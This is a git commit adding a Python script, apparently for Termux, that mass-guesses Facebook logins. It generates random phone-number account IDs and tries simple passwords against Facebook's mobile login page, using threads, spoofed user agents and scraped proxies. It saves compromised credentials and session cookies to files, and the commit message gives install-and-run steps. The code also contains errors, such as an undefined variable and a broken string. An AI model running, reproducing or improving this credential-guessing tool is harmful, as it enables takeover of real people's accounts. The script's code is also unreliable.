9cd29d92b0c31d2e08a6bca74d5530874e6c9518
Zainanika <147306194+Zainanika@users.noreply.github.com>
2023-11-04 03:36:26 +0500

    Create Zain.py
    pkg update
    
    pkg upgrade
    
    pkg install python
    
    pkg install python2
    
    pip2 install request
    
    pip2 install mechanize
    
    pkg install git
    
    git clone https://github.com/Sarkar-Zain-/ZAIN.git
    
    ls
    
    cd ZAIN
    
    python2 Zain.py

---
+++ Zain.py
@@ -0,0 +1,275 @@
+# NAME : ZAIN VAI 69
+# GITHUB : https://github.com/apon200490
+# WHATSAPP GROUP : ZAIN PAID COMMAND
+# FB ID :  @ZAIN VAI
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+try:
+ proxy= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.proxy.txt','w').write(proxy)
+except Exception as e:
+ print('')
+prox=open('.proxy.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+for ua in range(5000):
+     a='Mozilla/5.0 (Linux; Android'
+     b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+     y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+     c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+     d=random.randrange(40,115)
+     e='0'
+     f=random.randrange(3000,6000)
+     g=random.randrange(20,100)
+     h='Mobile Safari/537.36'
+     ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+     ugen.append(ug)
+for tg in range(1000):
+		a='Mozilla/5.0 (Linux; Android'
+		b=random.choice(['8','9','10','11','12','13','14','15'])
+		c='Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+		d=random.randrange(40,115)
+		e='0'
+		f=random.randrange(3000,6000)
+		g=random.randrange(20,100)
+		h='Mobile Safari/537.36'
+		ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
+		ugen.append(ua)
+for ua in range(5000):
+    a='NokiaX'
+    b=random.randrange(1,9)
+    c='-0'
+    d=random.randrange(1,9)
+    e='/'
+    f=random.randrange(1,9)
+    g='.0 ('
+    h=random.randrange(1,12)
+    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
+    j='UNTRUSTED/'
+    k=random.randrange(1,3)
+    l='.0'
+    CRACK=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
+    ugen.append(CRACK)
+
+for ua in range(5000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	y=random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
+	c='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	CRACK=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(CRACK)
+os.system("xdg-open https://www.facebook.com/crazehacker2000")
+# LOGO
+logo = ("""
+
+
+
+                                                  
+      
+
+ '\033[1;32m' ____  ____  _  _     
+'\033[1;32m /_   \/  _ \/ \/ \  /|
+ '\033[1;32m /   /| / \|| || |\ ||
+\033[1;32m /   /_| |-||| || | \||
+\033[1;32m \____/\_/ \|\_/\_/  \|
+                      
+
+                      
+
+                                                  
+
+""")
+# MAIN MANU 
+def Main():
+        os.system("clear")
+        print(logo)
+        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32mRANDOM HACK BD")
+        print(" \033[1;35m[\033[1;32m2\033[1;35m] \033[1;32mCONTACT ADMIN")
+        print(" \033[1;35m[\033[1;32m0\033[1;35m] \033[1;31mEXIT")
+        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        CRACK =input("\n \033[1;35m[😈\033[1;35m] \033[1;32mSELECTED YOUR OPTION : ")
+        if  CRACK in ["1","01"]:
+            sexy()
+        if ZAIN in ["2","02"]:
+        	os.system('xdg-open https://wa.me/+923066264859')
+        if ZAIN in [" 0", "00"]:
+            exit()
+        else:
+            exit()     
+def sexy():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print('\033[1;32m[😈\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m016\033[1;32m]\033[1;35m [\033[1;32m017\033[1;35m] \033[1;33m[\033[1;34m018\033[1;33m] \033[1;34m[\033[1;33m019\033[1;34m]')
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    code = input('\033[1;33m[😈\033[1;32m]\033[1;32m YOUR SIM CODE : ')
+    name = ''.join(random.choice(string.digits) for _ in range(2))
+    cod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print('\033[1;32m[😈\033[1;32m]\033[1;36m Example : \033[1;32m[\033[1;33m3000\033[1;32m]\033[1;35m [\033[1;32m5000\033[1;35m] \033[1;33m[\033[1;34m10000\033[1;33m] ')
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input('\033[1;33m[😈\033[1;32m]\033[1;32m YOUR LIMITED : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as asha:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print('\033[1;33m[😈\033[1;33m] \033[1;36mYOUR TOTAL IDS : \033[1;32m'+tl)
+        print("\033[1;33m[😈\033[1;33m] \033[1;36mYOUR SIM CODE :\033[1;32m "+code)
+        print('\033[1;33m[😈\033[1;33m]\033[1;35m PLEASE WAIT CLONING START')
+        print('\033[1;33m[😈\033[1;33m] \033[1;34mUSE FLIGHT MODE ON/OF FOR SPEED UP')
+        print('\033[1;33m[😈\033[1;33m] \033[1;35mSUPER FAST SPEED CLONING')
+        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for love in user:
+            uid = code+name+cod+love
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Pakistan' ' india]
+            asha.submit(alh4aj,uid,pwx,tl)
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    print(' [😈] OK ZAIN-SARKAR-OK.txt')
+    print(' [😈] CP ZAIN-SARKAR-OK.txt')
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+def alh4aj(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r\033[1;32m[DNC-ZAIN-SARKAR]\033[1;36m😈[%s/%s]🥴\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://p.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'p.facebook.com',
+    'method': 'GET',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Infinix X669C"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua}
+    # =[ UA = PRO ]= #
+            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[1;33m[\033[1;32mZAIN-CRACK-OK 😈\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
+                print(f"\033[1;92m[😈] COOKIE :\033[1;95m {coki}")
+                open('/sdcard/ZAIN-SARKAR-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"\033[1;33m[\033[1;32mZAIN-SARKAR-CP\033[1;33m]\033[1;91m {uid}|{ps}")
+                open('/sdcard/ZAIN-SARKAR-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+        
+Main()
+# END #
